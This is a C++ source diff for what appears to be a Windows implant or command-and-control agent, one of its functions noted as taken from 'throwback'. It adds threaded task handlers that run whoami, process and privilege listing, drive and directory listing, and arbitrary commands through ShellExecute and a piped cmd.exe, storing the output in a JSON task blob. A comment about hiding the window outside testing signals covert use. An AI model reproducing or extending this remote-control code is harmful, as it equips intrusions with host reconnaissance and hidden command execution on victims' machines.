@@ -10,6 +10,16 @@
 #include <iphlpapi.h>
 #pragma comment(lib, "iphlpapi.lib")
 
+#include "json.hpp"
+using json = nlohmann::json;
+
+struct createthread_in
+{
+	json *j;
+	int counter;
+	std::string input;
+};
+
 void cd(std::string path)
 {
 	SetCurrentDirectoryA(path.c_str());
@@ -18,6 +28,11 @@ void cd(std::string path)
 void cp(std::string src_file, std::string dest_file)
 {
 	CopyFileA(src_file.c_str(), dest_file.c_str(), FALSE);
+}
+
+void mv(std::string src_file, std::string dest_file)
+{
+	MoveFileA(src_file.c_str(), dest_file.c_str());
 }
 
 std::string get_internalip() //taken from throwback
@@ -133,6 +148,23 @@ std::string whoami()
 	return output;
 }
 
+DWORD WINAPI whoami_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+
+	// Perform pwd and stuff into json blob
+	(*j)["task_output"][i] = whoami();
+	(*j)["task_status"][i] = "complete";
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
+}
+
 std::string pwd()
 {
 	TCHAR directory[UNLEN + 1];
@@ -141,6 +173,23 @@ std::string pwd()
 	std::wstring directory_w(directory);
 	std::string directory_s(directory_w.begin(), directory_w.end());
 	return directory_s;
+}
+
+DWORD WINAPI pwd_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+
+	// Perform pwd and stuff into json blob
+	(*j)["task_output"][i] = pwd();
+	(*j)["task_status"][i] = "complete";
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
 }
 
 std::string drives()
@@ -160,6 +209,23 @@ std::string drives()
 		drives_bit = drives_bit >> 1; //right shift 
 	}
 	return return_string;
+}
+
+DWORD WINAPI drives_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+
+	// Perform pwd and stuff into json blob
+	(*j)["task_output"][i] = drives();
+	(*j)["task_status"][i] = "complete";
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
 }
 
 //https://docs.microsoft.com/en-us/windows/desktop/toolhelp/taking-a-snapshot-and-viewing-processes
@@ -226,6 +292,23 @@ std::string ps()
 	return return_string;
 }
 
+DWORD WINAPI ps_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+
+	// Perform pwd and stuff into json blob
+	(*j)["task_output"][i] = ps();
+	(*j)["task_status"][i] = "complete";
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
+}
+
 std::string privs()
 {
 	std::string return_string = "";
@@ -266,6 +349,23 @@ std::string privs()
 	return return_string;
 }
 
+DWORD WINAPI privs_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+
+	// Perform pwd and stuff into json blob
+	(*j)["task_output"][i] = privs();
+	(*j)["task_status"][i] = "complete";
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
+}
+
 //https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea
 //https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-_win32_find_dataa
 //https://docs.microsoft.com/en-us/windows/desktop/fileio/listing-the-files-in-a-directory
@@ -282,6 +382,10 @@ std::string ls(std::string path)
 	else if (path_flag == 1)
 	{
 		path_patch += "\\*";
+	}
+	else if (path == "")
+	{
+		path_patch = pwd() + "\\*";
 	}
 	else
 	{
@@ -344,105 +448,61 @@ std::string ls(std::string path)
 	return return_string;
 }
 
+DWORD WINAPI ls_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+	std::string path = thread_input->input;
+
+	// Perform ls and stuff into json blob
+	(*j)["task_output"][i] = ls(path);
+	(*j)["task_status"][i] = "complete";
+
+
+	// Delete structure
+	delete thread_input;
+
+	return 0;
+}
+
 std::string shell_exec(std::string user_input)
 {
-	std::string return_string = "";
+	std::string return_string = "no output";
 	std::string file = user_input.substr(0, user_input.find(' '));
 	std::string parameter = "";
 	if ((user_input.find(" ") != std::string::npos)) //Check for additional parameters
 	{
 		parameter = user_input.substr(user_input.find(' '), std::string::npos);
 	}
-	if ((int)ShellExecuteA(NULL, NULL, file.c_str(), parameter.c_str(), NULL, 0) <= 32) //Magic number from MSDN docs 
+	//set last paramater to 0 when not testing
+	if ((int)ShellExecuteA(NULL, NULL, file.c_str(), parameter.c_str(), NULL, 3) <= 32) //Magic number from MSDN docs 
 	{
 		return_string = "System Error: " + ConvertToString(GetLastError()) + "\n";
 	}
 	return return_string;
 }
 
-std::string create_process_exec(std::string user_input)
+DWORD WINAPI shell_exec_thread(__in LPVOID lpParameter)
 {
-	std::string return_string = "";
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+	std::string path = thread_input->input;
 
-	//Set parameters for CreatePipe()
-	HANDLE hReadPipe_Out = NULL;
-	HANDLE hWritePipe_Out = NULL;
+	// Perform shell_exec and stuff into json blob
+	(*j)["task_output"][i] = shell_exec(path);
+	(*j)["task_status"][i] = "complete";
 
-	SECURITY_ATTRIBUTES saAttr;
-	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-	saAttr.lpSecurityDescriptor = NULL;
-	saAttr.bInheritHandle = TRUE;
+	// Delete structure
+	delete thread_input;
 
-	BOOL CreatePipeOut = CreatePipe(&hReadPipe_Out, &hWritePipe_Out, &saAttr, NULL);
-	if (CreatePipeOut == NULL)
-	{
-		return_string = "CreatePipe() fail! System Error: " + GetLastError(); +"\n";
-		return return_string;
-	}
-
-	if (!SetHandleInformation(hReadPipe_Out, HANDLE_FLAG_INHERIT, 0))
-	{
-		printf("SetHandleInformation() fail! System Error: %d\n", GetLastError());
-	}
-
-	std::string appname = "C:\\Windows\\System32\\cmd.exe";
-	std::string commandline_temp = "/c " + user_input;
-	LPSTR commandline = const_cast<char *>(commandline_temp.c_str());
-
-	PROCESS_INFORMATION sProcInfo;
-	ZeroMemory(&sProcInfo, sizeof(PROCESS_INFORMATION));
-
-	STARTUPINFOA sStartInfo;
-	ZeroMemory(&sStartInfo, sizeof(STARTUPINFOA));
-	sStartInfo.cb = sizeof(STARTUPINFOA);
-	sStartInfo.hStdError = hWritePipe_Out;
-	sStartInfo.hStdOutput = hWritePipe_Out;
-	sStartInfo.hStdInput = hReadPipe_Out;
-	sStartInfo.dwFlags |= STARTF_USESTDHANDLES;
-
-	BOOL bSuccess = FALSE;
-	bSuccess = CreateProcessA(
-		appname.c_str(),		   // application name
-		commandline,     // command line 
-		NULL,          // process security attributes 
-		NULL,          // primary thread security attributes 
-		TRUE,          // handles are inherited 
-		0,             // creation flags 
-		NULL,          // use parent's environment 
-		NULL,          // use parent's current directory 
-		&sStartInfo,  // STARTUPINFO pointer 
-		&sProcInfo);  // receives PROCESS_INFORMATION 
-
-	if (bSuccess == NULL)
-	{
-		printf("CreateProcessA() fail! System Error: %d\n", GetLastError());
-	}
-	else
-	{
-		CloseHandle(sProcInfo.hProcess);
-		CloseHandle(sProcInfo.hThread);
-		CloseHandle(hWritePipe_Out);
-	}
-
-	DWORD dwRead;
-	DWORD dwWritten;
-	CHAR chBuf[4096];
-	bSuccess = FALSE;
-
-	for (;;)
-	{
-		bSuccess = ReadFile(hReadPipe_Out, chBuf, 4096, &dwRead, NULL);
-		if (!(bSuccess) || (dwRead == 0))
-		{
-			break;
-		}
-		return_string.append(chBuf, dwRead);
-	}
-	return return_string;
+	return 0;
 }
 
-
-std::string create_process_exec2(std::string user_input) //create_process_exec works, this needs to be cleaned up, i'll do it later
+std::string create_process_exec(std::string user_input)
 {
 	std::string return_string = "";
 
@@ -518,40 +578,66 @@ std::string create_process_exec2(std::string user_input) //create_process_exec w
 		printf("CreateProcessA() fail! System Error: %d\n", GetLastError());
 	}
 
+	// Read in the initial header for cmd.exe and throw it away
+	DWORD bytesAvailable;
+	DWORD bytesRead;
+	char buffer[4096];
+	Sleep(2000);
+	PeekNamedPipe(hReadPipe_Out, NULL, NULL, NULL, &bytesAvailable, NULL);
+	ReadFile(hReadPipe_Out, buffer, sizeof(buffer), &bytesRead, NULL);
+
 	// Send command to cmd.exe through anonymous pipe
 	DWORD bytesread = NULL;
-	printf("write to pipe: %s\nsize of write: %i\n", commandline, strlen(commandline));
-	if (WriteFile(hWritePipe_In, commandline, strlen(commandline), &bytesread, NULL))
+	if (!WriteFile(hWritePipe_In, commandline, strlen(commandline), &bytesread, NULL))
 	{
-		printf("write to pipe success\n");
+		return_string = "Write to pipe fail.";
+		return return_string;
 	}
 	
-	// CLose handles?
+	// Close handles?
 	CloseHandle(hWritePipe_In);
 	CloseHandle(hWritePipe_Out);
 	CloseHandle(sProcInfo.hProcess);
 	CloseHandle(sProcInfo.hThread);
 	
-
 	// Read shell command output
 	DWORD dwRead2;
 	DWORD dwWritten2;
 	CHAR chBuf2[4096];
 	bSuccess = FALSE;
-	//printf("BEGIN FINAL PIPE READ\n");
 	for (;;)
 	{
-		
 		bSuccess = ReadFile(hReadPipe_Out, chBuf2, 4096, &dwRead2, NULL);
 		if (!(bSuccess) || (dwRead2 == 0))
 		{
 			break;
 		}
-		//printf("%s\n", chBuf2);
 		return_string.append(chBuf2, dwRead2);
 	}
-	printf("SHELL EXEC COMPLETE\n\n");
 	
-	return return_string;
+	// Remove input string that is echo'd by cmd.exe
+	return (return_string.substr(return_string.find("\n") + 1));
 }
+
+DWORD WINAPI create_process_exec_thread(__in LPVOID lpParameter)
+{
+	// Break down LPVOID
+	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
+	json *j = thread_input->j;
+	int i = thread_input->counter;
+	std::string command = thread_input->input;
+	std::string output = create_process_exec(command);
+	printf("%s\n", output.c_str());
+	// Perform shell_exec and stuff into json blob
+	(*j)["task_status"][i] = "complete";
+	(*j)["task_output"][i] = output;
+	printf("updated\n");
+	
+	
+	// Delete structure
+	delete thread_input;
+
+	return 0;
+}
+
 #endif
